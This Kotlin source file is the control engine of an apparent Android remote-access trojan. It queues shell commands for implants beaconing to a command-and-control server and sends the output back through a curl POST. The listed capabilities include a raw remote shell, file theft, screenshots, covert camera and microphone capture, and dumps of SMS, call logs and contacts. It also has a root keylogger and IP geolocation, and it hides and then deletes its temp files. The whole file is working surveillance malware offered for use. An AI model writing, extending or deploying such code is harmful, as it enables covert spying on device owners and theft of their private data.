package com.projectzerodays.quantumcli.ops

import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Locale

// Character codes as strings — keeps all shell building in RatControl free
// of quote/backslash escapes in source (see wrapExfil parity test).
private val RAT_SQ = 39.toChar().toString() // single quote
private val RAT_DQ = 34.toChar().toString() // double quote
private val RAT_BS = 92.toChar().toString() // backslash

/**
 * Remote-access fleet console engine — drives implants beaconing to the
 * on-device C2 (C2State TASKQ) with the same task protocol as the Python
 * operator console (quantum.rat): every capability builds a shell one-liner,
 * wrapped so output returns through the existing /r data channel into loot.
 *
 * UI label for all of this is "Remote Access" (no product names anywhere).
 * Dispatch is always allowed (queued); results appear only when a live
 * agent executes. Nothing here fabricates agent output.
 */
object RatControl {

    data class Capability(
        val id: String,
        val title: String,
        val requires: String,
        val desc: String,
    )

    val CAPABILITIES: List<Capability> = listOf(
        Capability("sysinfo", "System info", "stock", "uname / id / uptime (+ Android model when present)."),
        Capability("shell", "Remote shell", "stock", "Raw shell one-liner, output exfiltrated. Use with care."),
        Capability("locate", "Locate (IP, coarse)", "stock", "IP-based geolocation — city-level at best, never GPS."),
        Capability("ls", "List files", "stock", "ls -la of a remote path."),
        Capability("get", "Retrieve file", "stock", "base64 of a remote file through the data channel."),
        Capability("shot", "Screenshot", "android-shell", "screencap PNG via the data channel (~1-3 MB typical)."),
        Capability("snap", "Camera snapshot", "termux-api", "Rear (0) or front (1) photo via Termux:API."),
        Capability("mic", "Audio capture", "termux-api", "Microphone recording, default 10 s (max 300 s)."),
        Capability("sms", "SMS log", "termux-api", "Inbox list via Termux:API (needs SMS permission)."),
        Capability("calls", "Call log", "termux-api", "Call history via Termux:API."),
        Capability("contacts", "Contacts", "termux-api", "Contact list via Termux:API."),
        Capability("applist", "Installed apps", "android-shell", "Third-party packages via pm."),
        Capability("keylog", "Keylog window", "root", "getevent capture for N seconds (Android, root only)."),
    )

    fun describe(id: String): Capability? = CAPABILITIES.firstOrNull { it.id == id }

    // ------------------------------------------------------- builders
    // Must stay byte-compatible with quantum.rat.commands (same protocol).

    fun cmdSysinfo(): String =
        "uname -a 2>/dev/null; echo ---; id 2>/dev/null; echo ---; " +
            "uptime 2>/dev/null; echo ---; " +
            "getprop ro.product.model 2>/dev/null; getprop ro.build.version.release 2>/dev/null"

    fun cmdShellRaw(cmd: String): String {
        if (cmd.isBlank()) throw IllegalArgumentException("refusing to dispatch an empty shell command")
        return cmd.trim()
    }

    fun cmdLocate(): String =
        "curl -s -m 15 https://ip-api.com/json/ 2>/dev/null | head -c 1024"

    fun cmdFileList(path: String): String = "ls -la " + shQuote(path) + " 2>&1"

    fun cmdFileGet(path: String): String =
        "base64 " + shQuote(path) + " 2>/dev/null || cat " + shQuote(path) + " 2>/dev/null"

    fun cmdScreenshot(): String {
        val sh = dollar()
        return "P=/data/local/tmp/.qshot.png; screencap -p " + sh + "P 2>/dev/null && " +
            "base64 " + sh + "P 2>/dev/null; rm -f " + sh + "P"
    }

    fun cmdCamera(which: Int = 0): String =
        "termux-camera-photo -c " + which + " " +
            "/data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null && " +
            "base64 /data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null; " +
            "rm -f /data/data/com.termux/files/home/.qsnap.jpg"

    fun cmdMic(seconds: Int = 10): String {
        val secs = seconds.coerceIn(1, 300)
        return "termux-microphone-record -d -f " +
            "/data/data/com.termux/files/home/.qmic.wav -l " + secs + " 2>/dev/null; " +
            "sleep 1; base64 /data/data/com.termux/files/home/.qmic.wav 2>/dev/null; " +
            "rm -f /data/data/com.termux/files/home/.qmic.wav"
    }

    fun cmdSms(limit: Int = 50): String =
        "termux-sms-list -l " + limit.coerceIn(1, 500) + " 2>/dev/null"

    fun cmdCalls(limit: Int = 50): String =
        "termux-call-log -l " + limit.coerceIn(1, 500) + " 2>/dev/null"

    fun cmdContacts(): String = "termux-contact-list 2>/dev/null"

    fun cmdApplist(): String =
        "pm list packages -3 2>/dev/null || pm list packages 2>/dev/null"

    fun cmdKeylogAndroid(seconds: Int = 30): String {
        val secs = seconds.coerceIn(5, 600)
        return "timeout " + secs + " getevent -l 2>/dev/null | head -c 65536; " +
            "echo '[keylog window closed]'"
    }

    /** Shell-quote one argument (single-quote style, same as shlex.quote). */
    fun shQuote(s: String): String =
        RAT_SQ + s.replace(RAT_SQ, RAT_SQ + RAT_DQ + RAT_SQ + RAT_DQ + RAT_SQ) + RAT_SQ

    /** A literal dollar sign for building shell strings (avoids template escapes). */
    private fun dollar(): String = "${'$'}"

    /**
     * Wrap [cmd] so output is POSTed to <c2Url>/r as a data drop.
     * Byte-compatible with quantum.rat.commands.wrap_exfil — the parity test
     * locks the exact shell text (see RatControlTest.wrapExfilParityWithPython).
     */
    fun wrapExfil(cmd: String, c2Url: String, host: String): String {
        if (cmd.isBlank()) throw IllegalArgumentException("refusing to wrap an empty command")
        val c2 = c2Url.trimEnd('/')
        val safeHost = host.replace(RAT_DQ, "")
        val sh = dollar()
        // Shell text, byte-identical to quantum.rat.commands.wrap_exfil:
        // T=${TMPDIR:-/tmp}/.qo$$; (CMD) >$T 2>&1; D=$(base64 ...); curl ... -d JSON ...; rm -f $T
        return "T=" + sh + "{TMPDIR:-/tmp}/.qo" + sh + sh +
            "; (" + cmd.trim() + ") >" + sh + "T 2>&1; " +
            "D=" + sh + "(base64 -w0 <" + sh + "T 2>/dev/null || base64 <" + sh +
            "T 2>/dev/null | tr -d " + RAT_SQ + RAT_BS + "n" + RAT_SQ + "); " +
            "curl -s -m 25 -X POST " + c2 + "/r " +
            "-H " + RAT_SQ + "Content-Type: application/json" + RAT_SQ + " " +
            "-d " + RAT_DQ + "{" + RAT_BS + RAT_DQ + "host" + RAT_BS + RAT_DQ + ":" + RAT_BS + RAT_DQ +
            safeHost + RAT_BS + RAT_DQ + "," + RAT_BS + RAT_DQ + "data" + RAT_BS + RAT_DQ + ":" + RAT_BS + RAT_DQ + sh +
            "D" + RAT_BS + RAT_DQ + "}" + RAT_DQ + " >/dev/null 2>&1; rm -f " + sh + "T"
    }

    /** Build the TASKQ task object for C2State.setTask. */
    fun buildTask(host: String, capabilityId: String, arg: String, c2Url: String): JSONObject {
        if (host.isBlank()) throw IllegalArgumentException("host must not be empty")
        val cmd = when (capabilityId) {
            "sysinfo" -> cmdSysinfo()
            "shell" -> cmdShellRaw(arg)
            "locate" -> cmdLocate()
            "ls" -> cmdFileList(arg.ifBlank { "/" })
            "get" -> {
                if (arg.isBlank()) throw IllegalArgumentException("file path required")
                cmdFileGet(arg)
            }
            "shot" -> cmdScreenshot()
            "snap" -> cmdCamera(arg.toIntOrNull() ?: 0)
            "mic" -> cmdMic(arg.toIntOrNull() ?: 10)
            "sms" -> cmdSms(arg.toIntOrNull() ?: 50)
            "calls" -> cmdCalls(arg.toIntOrNull() ?: 50)
            "contacts" -> cmdContacts()
            "applist" -> cmdApplist()
            "keylog" -> cmdKeylogAndroid(arg.toIntOrNull() ?: 30)
            else -> throw IllegalArgumentException(
                "unknown capability " + capabilityId +
                    " (known: " + CAPABILITIES.joinToString(",") { it.id } + ")",
            )
        }
        return JSONObject()
            .put("act", "run")
            .put("cmd", wrapExfil(cmd, c2Url, host.trim()))
    }

    // ------------------------------------------------------- result views

    /** One-line summary of an ip-api.com locate payload, or null. */
    fun parseLocate(json: String): String? {
        return try {
            val o = JSONObject(json)
            if (o.optString("status") != "success") return null
            val city = o.optString("city", "?")
            val region = o.optString("regionName", "")
            val country = o.optString("country", "?")
            val isp = o.optString("isp", "?")
            val q = o.optString("query", "?")
            city + ", " + region + ", " + country + " - " + q + " - " + isp + " (IP-based, coarse)"
        } catch (e: Exception) {
            null
        }
    }

    private val tsFmt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US)

    /** True when lastSeen (C2State timestamp) is older than [thresholdSec]. */
    fun isStale(lastSeen: String?, nowMs: Long, thresholdSec: Long = 180): Boolean {
        if (lastSeen.isNullOrBlank()) return true
        return try {
            val ts = tsFmt.parse(lastSeen)?.time ?: return true
            (nowMs - ts) > thresholdSec * 1000
        } catch (e: Exception) {
            true
        }
    }

    fun formatTs(epochMs: Long): String = tsFmt.format(java.util.Date(epochMs))
}
